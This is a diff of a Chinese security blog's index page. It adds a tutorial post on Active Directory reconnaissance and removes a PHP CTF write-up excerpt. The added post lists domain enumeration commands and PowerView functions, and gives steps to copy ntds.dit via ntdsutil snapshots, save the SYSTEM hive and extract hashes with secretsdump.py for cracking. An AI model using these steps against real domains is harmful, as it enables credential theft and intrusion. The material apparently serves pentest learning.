@@ -144,6 +144,146 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-域内信息搜集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">域内信息搜集</a>
+    </h1>
+  
+
+        
+        <a href="/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="archive-article-date">
+  	<time datetime="2022-02-19T15:31:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h1><h1 id="一、判断自己的身份"><a href="#一、判断自己的身份" class="headerlink" title="一、判断自己的身份"></a>一、判断自己的身份</h1><p>判断自己的身份最简单的方式就是whoami</p>
+<p>如果是本地非域用户的话，就是计算机名称/账号</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235145684.png" alt="image-20220219235145684"></p>
+<p>如果是域内用户账号的话，就是域名称/账号</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235255908.png" alt="image-20220219235255908"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt=ns lab.com  //定位DC</span><br><span class="line">net time /domain //查看时间服务器</span><br><span class="line">hostname //查看本机名字</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235536326.png" alt="image-20220219235536326"></p>
+<h1 id="二、定位DC及获取用户、组信息"><a href="#二、定位DC及获取用户、组信息" class="headerlink" title="二、定位DC及获取用户、组信息"></a>二、定位DC及获取用户、组信息</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">net config workstation //查询当前登陆域及登录的用户信息</span><br><span class="line">net user /domain  //查询域内用户</span><br><span class="line">wmic useraccount get /all 查询域内用户的详细信息</span><br><span class="line">net accounts /domain 查看域的密码策略</span><br><span class="line">net user xxx /domain  查看指定域用户lab的详细信息</span><br><span class="line">net view /domain 查看有几个域</span><br><span class="line">net view /domain:xxx 查看域内的主机</span><br><span class="line">net group /domain 查看域里面的组</span><br><span class="line">net group &quot;domainn users&quot; //查看域用户</span><br><span class="line">net group &quot;domain controllers&quot; /domian 查看域控制器</span><br><span class="line">net group &quot;domain computers&quot; /domain查看域内所有主机</span><br><span class="line">net group &quot;domain admins&quot; /domain查看域管理员，该组内的成员对域控拥有完全控制权</span><br><span class="line">net group &quot;enterprise admins&quot; /domain 查看企业管理组，该组内的成员对域控拥有完全控制权</span><br><span class="line">net group &quot;domain guest&quot; /domain 查看域访客组，权限较低</span><br><span class="line">net accounts /domain #查询域密码策略</span><br><span class="line">whoami /user #查看⽤户SID和域SID</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220001656102.png" alt="image-20220220001656102"></p>
+<p>域的sid是500之前的，用户sid是500</p>
+<p>当你是域控用户的时候可以输入以下命令查询域内信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dsquery user #查询⽬录中的⽤户</span><br><span class="line">dsquery computer #查询⽬录中的主机</span><br><span class="line">dsquery group #查询⽬录中的组</span><br><span class="line">dsquery ou #查询⽬录中的组织单元</span><br><span class="line">dsquery site #查询⽬录中的站点</span><br><span class="line">dsquery server #查询域控</span><br><span class="line">dsquery contact #查询⽬录中的联系⼈</span><br><span class="line">dsquery subnet #查询⽬录中的⼦⽹</span><br><span class="line">dsquery quota #查询⽬录中的配额规定</span><br><span class="line">dsquery partition #查询⽬录中的分区</span><br><span class="line">dsquery server –domain lab.com | dsget server–dnsname –site #搜索域内</span><br><span class="line">域控制器的DNS主机名和站点名</span><br><span class="line">dsquery computer domainroot –name -xp –limit n #搜索域内以-xp结尾的机</span><br><span class="line">器n台</span><br><span class="line">dsquery user domainroot –name admin -limit n #搜索域内以admin开头</span><br><span class="line">的⽤户n个</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="三、登陆历史"><a href="#三、登陆历史" class="headerlink" title="三、登陆历史"></a>三、登陆历史</h1><p>最原始的方式是通过注册表里HKEY_USERS的key值来查询谁登录过本机，同样也调用到了 NetSessionEnum API。但是有以下工具可以帮助我们快速查看</p>
+<h2 id="1-psloggedon-exe"><a href="#1-psloggedon-exe" class="headerlink" title="1.psloggedon.exe"></a>1.psloggedon.exe</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">PsLoggedOn - Windows Sysinternals | Microsoft Docs</a></p>
+<p>此工具用于查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe \\域名</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220002424852.png" alt="image-20220220002424852"></p>
+<h2 id="2-PVEFindADUser-exe"><a href="#2-PVEFindADUser-exe" class="headerlink" title="2.PVEFindADUser.exe"></a>2.PVEFindADUser.exe</h2><p><a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/blob/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe">Tools/PVEFindADUser.exe at master · chrisdee/Tools · GitHub</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe -current -target hostname</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220003159391.png" alt="image-20220220003159391"></p>
+<h2 id="3-Powerview-ps1"><a href="#3-Powerview-ps1" class="headerlink" title="3.Powerview.ps1"></a>3.Powerview.ps1</h2><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br></pre></td></tr></table></figure>
+
+<p>powerview.ps1是非常全面的，它有如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1. Get-NetDomain 获取当前⽤户所在域的名称</span><br><span class="line">2. Get-NetUser 获取所有⽤户的详细信息</span><br><span class="line">3. Get-NetDomainController 获取所有域控制器的信息</span><br><span class="line">4. Get-NetComputer 获取域内所有机器的详细信息</span><br><span class="line">5. Get-NetPrinter 获取域中所有当前计算机对象的数组</span><br><span class="line">6. Get-NetOU 获取域内的OU信息</span><br><span class="line">7. Get-NetGroup 获取所有域内组和组成员的信息</span><br><span class="line">8. Get-NetGroupMember 获取指定域组中所有当前⽤户的列表</span><br><span class="line">9. Get-NetFileServer 根据SPN获取当前域使⽤的⽂件服务器信息</span><br><span class="line">10. Get-NetShare 获取当前域内所有的⽹络共享信息</span><br><span class="line">11. Get-DFSshare 获取域上所有分发⽂件系统共享的列表</span><br><span class="line">12. Get-NetSubnet 获取域的其他⽹段</span><br><span class="line">13. Get-NetSite 获取域内的当前站点</span><br><span class="line">14. Get-NetDomainTrust 获取当前⽤户域的所有信任</span><br><span class="line">15. Get-NetForestTrust 获取与当前⽤户的域关联的林的所有信任</span><br><span class="line">16. Find-ForeignUser 枚举在其主域之外的组中的⽤户</span><br><span class="line">17. Find-ForeignGroup 枚举域组的所有成员并查找查询域之外的⽤户</span><br><span class="line">18. Invoke-MapDomainTrust 尝试构建所有域信任的关系映射</span><br><span class="line">19. Get-NetLoggedon 获取主动登录到指定服务器的⽤户</span><br><span class="line">20. Get-NetLocalGroup 获取⼀个或多个远程主机上本地组的成员</span><br><span class="line">21. Get-NetSession 获取指定服务器的会话</span><br><span class="line">22. Get-NetRDPSession 获取指定服务器的远程连接</span><br><span class="line">23. Get-NetProcess 获取远程主机的进程</span><br><span class="line">24. Get-UserEvent 获取指定⽤户的⽇志</span><br><span class="line">25. Get-ADObject 获取活动⽬录的对象</span><br><span class="line">26. Get-NetGPO 获取域内所有的组策略对象</span><br><span class="line">27. Get-NetGPOGroup 获取域中设置”受限组”的所有GPO</span><br><span class="line">28. Find-GPOLocation 获取⽤户/组，并通过GPO枚举和关联使其具有有效权限的计</span><br><span class="line">算机</span><br><span class="line">29. Find-GPOComputerAdmin 获取计算机并通过GPO枚举确定谁对其具有管理权限</span><br><span class="line">30. Get-DomainPolicy 获取域默认策略或域控制器策略</span><br><span class="line">31. Get-DomainSID 返回指定域的SID</span><br><span class="line">32. Invoke-UserHunter 获取域⽤户登录的计算机信息及该⽤户是否有本地管理员权</span><br><span class="line">限</span><br><span class="line">33. Invoke-ProcessHunter 通过查询域内所有的机器进程找到特定⽤户</span><br><span class="line">34. Invoke-UserEventHunter 根据⽤户⽇志查询某域⽤户登陆过哪些域机器</span><br><span class="line">35. Invoke-ShareFinder 在本地域中的主机上查找（⾮标准）共享</span><br><span class="line">36. Invoke-FileFinder 在本地域中的主机上查找潜在的敏感⽂件</span><br><span class="line">37. Find-LocalAdminAccess 在域上查找当前⽤户具有本地管理员访问权限的计算机</span><br><span class="line">38. Find-ManagedSecurityGroups 搜索受管理的活动⽬录安全组并标识对其具有写</span><br><span class="line">访问权限的⽤户，即这些组拥有添加或删除成员的能⼒</span><br><span class="line">39. Get-ExploitableSystem 发现系统可能易受常⻅攻击</span><br><span class="line">40. Invoke-EnumerateLocalAdmin 枚举域中所有计算机上本地管理员组的成员</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、域信任关系"><a href="#四、域信任关系" class="headerlink" title="四、域信任关系"></a>四、域信任关系</h1><p>域信任是为了解决多域环境中的跨域资源共享问题而诞生的。两个域之间必须拥有信任关系，才可以访问到对方域内的资源。任何一个新的子域加入到域树之后。这个域会自动信任其上一层的父域，同时父域也会自动信任新子域，而且这些信任具有双向传递性。由于此信任⼯作是通过Kerberos security protocol来完成的，因为也被成为KerberosTrust。</p>
+<p>域信任利⽤DNS服务器定位两个不同⼦域的域控制器，如果两个域中的域控制器都⽆法 找到另⼀个域，那么也就不存在通过域信任关系进⾏跨域资源共享。</p>
+<p>域环境不会⽆条件地接收来⾃其他域的凭证，只会接收来⾃受信任的域的凭证。在默认 情况下,特定 Windows域中的所有⽤户都可以通过该域中的资源进⾏身份验证。通过这种⽅式, 域可以为其⽤户提供对该域中所有资源的安全访问机制。如果⽤户想要访问边界以外的资源, 需要使⽤域信任。 </p>
+<p>域信任关系类型： ● 单向信任 是指在两个域之间创建单向的信任路径，即在⼀个⽅向.上是信任流，在另⼀个⽅向 上是访问流。在受信任域和信任域之间的单向信任中，受信任域内的⽤户或计算机可以访问信 任域中的资源，但信任域内的⽤户却⽆法访问受信任域内的资源。也就是说，若A域信任B 域，那么B域内受信任的主体可以访问A域内信任B域的资源。 ● 双向信任 是指两个单向信任的组合，信任域和受信任域彼此信任，在两个⽅向上都有信任流 和访问流。这意味着，可以从两个⽅向在两个域之间传递身份验证请求。活动⽬录中的所有域 信任关系都是双向可传递的。在创建⼦域时，会在新的⼦域和⽗域之间⾃动创建双向可传递信 任关系。 </p>
+<p>建⽴信任的⽬的是允许来⾃⼀个域的⽤户访问资源（如服务器上的本地管理员组），嵌套在组 中或以其他⽅式使⽤另⼀个域中的安全主体（例如⽤于 AD 对象 ACL ）。 对此有个例外是域 林内信任（存在于同⼀ Active Directory 林中的域信任）——在林中创建的任何域都与林中的 每个其他域保持隐式双向、可传递的信任关系。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts  //查看域信任信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220004301275.png" alt="image-20220220004301275"></p>
+<h1 id="五、NTDS-dit导出hash"><a href="#五、NTDS-dit导出hash" class="headerlink" title="五、NTDS.dit导出hash"></a>五、NTDS.dit导出hash</h1><p>在活动目录中，所有的数据都保存在域控的ntds.dit文件中。</p>
+<p>ntds.dit是一个二进制文件，文件路径为域控的<code>%SystemRoot%\ntds\ntds.dit</code>。NTDS.dit包含不限于用户名、散列值、组、GPP、OU等活动目录的信息。系统运维人员可以使用VSS（Volumn shadow copy servcice，卷映射拷贝服务）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先在cmd中创建快照</span><br><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005025693.png" alt="image-20220220005025693"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用GUID挂在快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;刚才的快照序号&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005512106.png" alt="image-20220220005512106"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将挂载文件中的ntds.dit复制出来</span><br><span class="line">copy C:\$SNAP_20220220048_VOLUMEC$\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005909927.png" alt="image-20220220005909927"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">卸载快照并删除快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;序列号&#125;&quot; &quot;delete &#123;序列号&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220010236881.png" alt="image-20220220010236881"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询当前系统所有快照</span><br><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p>要想得到域的用户名导出信息等，还需要注册表下的system文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system c:\system</span><br></pre></td></tr></table></figure>
+
+<p>要想提取ntds.dit的hash也有很多方法，这里就只拿出一点简便的</p>
+<p>使用impack工具包下的secretsdump.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -system system -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
+
+<p>然后解出来的hash去解密就好了。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂念</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Liunx权限维持" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1198,95 +1338,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/12/14/%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%8F%E5%8E%86wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-php代码审计练习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/">php代码审计练习</a>
-    </h1>
-  
-
-        
-        <a href="/2021/12/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2021-12-14T08:14:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="php代码审计练习"><a href="#php代码审计练习" class="headerlink" title="php代码审计练习"></a>php代码审计练习</h1><h1 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h1><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211103215838853.png" alt="image-20211103215838853"></p>
-<h2 id="函数解析："><a href="#函数解析：" class="headerlink" title="函数解析："></a>函数解析：</h2><h3 id="bin2hex-："><a href="#bin2hex-：" class="headerlink" title="bin2hex()："></a>bin2hex()：</h3><p>函数把 ASCII 字符的字符串转换为十六进制值。字符串可通过使用 pack() 函数再转换回去。</p>
-<h3 id="hex2bin-："><a href="#hex2bin-：" class="headerlink" title="hex2bin() ："></a>hex2bin() ：</h3><p>函数把十六进制值的字符串转换为 ASCII 字符。</p>
-<h3 id="strrev-："><a href="#strrev-：" class="headerlink" title="strrev() ："></a>strrev() ：</h3><p>函数反转字符串。</p>
-<p>要想得到flag需要把字符串反解码，于是我们可以通过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&quot;;</span><br><span class="line">$str=base64_decode($str);</span><br><span class="line">$str=bin2hex($str);</span><br><span class="line">$str=strrev($str);</span><br><span class="line">$str=hex2bin($str);</span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>得到flag{582a0f2c7e302244b110cc461f5cb100}</p>
-<h1 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h1><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211105152907290.png" alt="image-20211105152907290"></p>
-<p>要想得到flag，需要满足输入的时间介于 7 776 000和5 184 000之间，然后就会让系统等待这么久出现flag，当然我们不能等待这么久，所以可以选择科学技术法来绕过。php在转换科学计数法的时候，遇到的e会认为是字符，只会截取前面的数字，所以这里我们</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=?time=6e6</span><br></pre></td></tr></table></figure>
-
-<p>就可以只需要等待6秒，绕过判断。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211105154500255.png" alt="image-20211105154500255"></p>
-        
-          <a class="article-more-a" href="/2021/12/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/">展开全文 >></a>
         </p>
       
 
